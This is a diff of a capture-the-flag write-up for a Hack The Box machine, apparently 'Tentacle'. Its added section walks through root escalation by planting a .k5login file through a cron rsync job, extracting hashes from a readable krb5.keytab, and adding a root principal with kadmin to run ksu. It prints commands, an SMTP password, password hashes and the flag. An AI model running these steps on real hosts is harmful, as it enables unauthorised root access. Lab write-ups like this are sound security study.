@@ -199,19 +199,19 @@ lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -> /dev/null
 
 That file (the one identified with the arrow) got my attention because i never found it and is not a default file. Checking it out we can see **j.nakazawa** password
 ```
-# Set default values for all following accounts.                                                                                                                           
-defaults                                                                                                                                                                   
-auth           on                                                                                                                                                          
-tls            on                                                                                                                                                          
-tls_trust_file /etc/ssl/certs/ca-certificates.crt                                                                                                                          
-logfile        /dev/null                                                                                                                                                   
-                                                                                                                                                                           
+# Set default values for all following accounts.
+defaults
+auth           on
+tls            on                                                                                                           
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+                                                                                                                                                                       
 # RealCorp Mail                                                                                                                                                            
-account        realcorp                                                                                                                                                    
-host           127.0.0.1                                                                                                                                                   
-port           587                                                                                                                                                         
-from           j.nakazawa@realcorp.htb                                                                                                                                     
-user           j.nakazawa                                                                                                                                                  
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
 password       sJB}RM>6Z~64_                                                                                                                                               
 tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60                                                                                                
                                                                                                                                                                            
@@ -224,21 +224,21 @@ checking the smtpd config
 cmd: cat /etc/smtpd/smtpd.conf                                                                                                                                             
 # $OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $                                                                                                             
                                                                                                                                                                            
-pki smtp.realcorp.htb cert         "/etc/smtpd/tls/smtpd.crt"                                                                                                              
-pki smtp.realcorp.htb key          "/etc/smtpd/tls/smtpd.key"                                                                                                              
+pki smtp.realcorp.htb cert         "/etc/smtpd/tls/smtpd.crt" 
+pki smtp.realcorp.htb key          "/etc/smtpd/tls/smtpd.key" 
                                                                                                                                                                            
-table creds                    "/etc/smtpd/creds"                                                                                                                          
-table vdoms                    "/etc/smtpd/vdoms"                                                                                                                          
-table vusers                   "/etc/smtpd/vusers"                                                                                                                         
+table creds                    "/etc/smtpd/creds"
+table vdoms                    "/etc/smtpd/vdoms"
+table vusers                   "/etc/smtpd/vusers"
                                                                                                                                                                            
-listen on 0.0.0.0                                                                                                                                                          
-listen on 127.0.0.1 port 465 smtps pki smtp.realcorp.htb auth <creds>                                                                                                      
-listen on 127.0.0.1 port 587 tls-require pki smtp.realcorp.htb auth <creds>                                                                                                
+listen on 0.0.0.0
+listen on 127.0.0.1 port 465 smtps pki smtp.realcorp.htb auth <creds>
+listen on 127.0.0.1 port 587 tls-require pki smtp.realcorp.htb auth <creds>
                                                                                                                                                                            
-action receive mbox virtual <vusers>                                                                                                                                       
-action send relay                                                                                                                                                          
+action receive mbox virtual <vusers>
+action send relay
                                                                                                                                                                            
-match from any for domain <vdoms> action receive                                                                                                                           
+match from any for domain <vdoms> action receive
 match for any action send
 ```
 
@@ -309,10 +309,10 @@ runc was found in /usr/bin/runc, you may be able to escalate privileges with it 
 
 # some emails 
 Mails (limit 50)                                                                                                                                         
- 50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/mail/j.nakazawa                                                              
- 50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/mail/admin                                                                   
- 50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/spool/mail/j.nakazawa                                                        
- 50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/spool/mail/admin
+50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/mail/j.nakazawa                                                              
+50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/mail/admin                                                                   
+50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/spool/mail/j.nakazawa                                                        
+50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/spool/mail/admin
 
 # Hashes
 /etc/squid/passwd:$apr1$KBOOx3/n$sPmARSLs1JmAg.06x5/Cx/
@@ -327,3 +327,168 @@ r.babelli:$apr1$Sercqs5t$yI/wQKpoXScAdjhI.9dBL0
 ```
 
 Tried to crack them with hashcat but without any success. Emails are also empty so no need to check them <br>
+
+
+So the last thing to check is the script **/usr/local/bin/log_backup.sh** executed by the cronjob every second. Lets check its contents out
+```bash
+cmd: cat /usr/local/bin/log_backup.sh
+
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+```
+
+So, by the looks of it, it seems that:
+1. it copies everything from **/var/log/squid** to **/hom/admin/**
+2. changes directories to the admin home folder
+3. compress **access/cache.log** with tar
+4. removes the compressed files 
+
+At first glance we cannot do much here, lets check what is inside **/var/log/squid** not forgetting that we are in an account that is in the **squid group**
+```
+cmd: ls -la /var/log/squid
+ls: cannot open directory '/var/log/squid': Permission denied
+
+cmd: ls -la /var/log
+drwx-wx---.  2 admin  squid      41 Dec 24 06:36 squid
+```
+
+Suprisingly, we **cannot read** whatever is inside but we can **write and execute** <br>
+
+The initial idea was to generate an **SSH** key locally and create an **authorized_keys** file in order to login but after further testing i came out to the conclusion that it is not allowed/enabled <br>
+
+So i went searching for **"kerberos grant other user permission"**, and found [this](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Granting-Access-to-Your-Account.html)
+```sql
+If you need to give someone access to log into your account, you can do so through Kerberos, without telling the person your password. Simply create a file called .k5login in your home directory
+
+--- snip ---
+jennifer@ATHENA.MIT.EDU
+david@EXAMPLE.COM
+
+--- snip ---
+```
+
+This exactly what we needed to get admin access just by authorizing our current user to ssh into it. We just need to do the following
+```bash
+cmd: vi .k5login
+j.nakazawa@REALCORP.HTB
+
+cmd: cp .k5login /var/log/squid/
+```
+
+Now, if there are a lot of logs, it might take a while to complete the execution (i even needed to reset the machine to clear the logs). But when it finishes the execution we can connect to admin, via ssh, in our local machine
+```bash
+cmd: ssh admin@10.10.10.224
+cmd: whoami && id
+admin
+uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
+Now onto root !! <br>
+```
+-rw-r-----. 1 root squid 3236 Dec 21 08:09 /etc/squid/squid.conf
+-rw-r-----. 1 root admin 1403 Dec 19 06:10 /etc/krb5.keytab
+
+/home/admin/.gnupg/trustdb.gpg
+
+/.bash_history
+```
+
+That **/etc/krb5.keytab** should only be readable and writable by root, but we can read it. This file allows to authenticate and to impersonate users [here](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-whitepaper.pdf) <br>
+
+Found these hashes with [this](https://github.com/sosdave/KeyTabExtract)
+
+```bash
+./keytabextract.py krb5.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : REALCORP.HTB
+        SERVICE PRINCIPAL : host/srv01.realcorp.htb
+        NTLM HASH : 771699676e1d3729e9ce6e278084a2e1
+        AES-256 HASH : 95910155bd1f1925ca8aba96e0fbdb0f37a179a4c0226b12b9820be15e122e01
+        AES-128 HASH : c62b475bf094d6f0045c477704adb49e
+```
+
+We can also extract more information with [KeytabParser.py](https://github.com/its-a-feature/KeytabParser) and **klist**
+```bash
+# KeytabParser
+
+cmd: python2.7 KeytabParser.py krb5.keytab
+
+17729
+{
+    "host/srv01.realcorp.htb@REALCORP.HTB": {
+        "keys": [
+            {
+                "EncType": "aes256-cts-hmac-sha1-96", 
+                "Key": "lZEBVb0fGSXKirqW4PvbDzeheaTAImsSuYIL4V4SLgE=", 
+                "KeyLength": 32, 
+                "Time": "2020-12-08 22:15:30"
+            }
+        ]
+    }
+}
+
+# Klist
+cmd: klist -k krb5.keytab
+
+Keytab name: FILE:krb5.keytab
+KVNO Principal
+---- --------------------------------------------------------------------------
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+```
+I found this information extraction at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-accounts-from-etckrb5keytab) <br>
+
+Now, to make use of the **krb5.keytab** file, we can use [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html) (which is a command-line interface to the Kerberos administration system) in order to try a possible privesc <br>
+
+From the above link (kadmin) we can see the available commands. We can **add_princiapl newprinc** and set the password for it. Since 
+
+```bash
+cmd: kadmin -k -t krb5.keytab -p kadmin/admin@REALCORP.HTB
+
+cmd (kadmin): list_principals
+K/M@REALCORP.HTB
+host/srv01.realcorp.htb@REALCORP.HTB
+j.nakazawa@REALCORP.HTB
+kadmin/admin@REALCORP.HTB
+kadmin/changepw@REALCORP.HTB
+kadmin/srv01.realcorp.htb@REALCORP.HTB
+kiprop/srv01.realcorp.htb@REALCORP.HTB
+krbtgt/REALCORP.HTB@REALCORP.HTB
+
+cmd (kadmin): add_principal root
+Password: wazagod
+Re-enter Password: wazagod
+```
+Now we need to login as the new principal. For that, we can use the kerberos utility [KSU](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/ksu.html)
+```
+cmd: ksu root
+Password: wazagod
+
+cmd: whoami && id
+root
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+cmd: cat /root/root.txt
+# FLAG: 39aa2f621d5770b2c11975127be1a1d1
+```
+
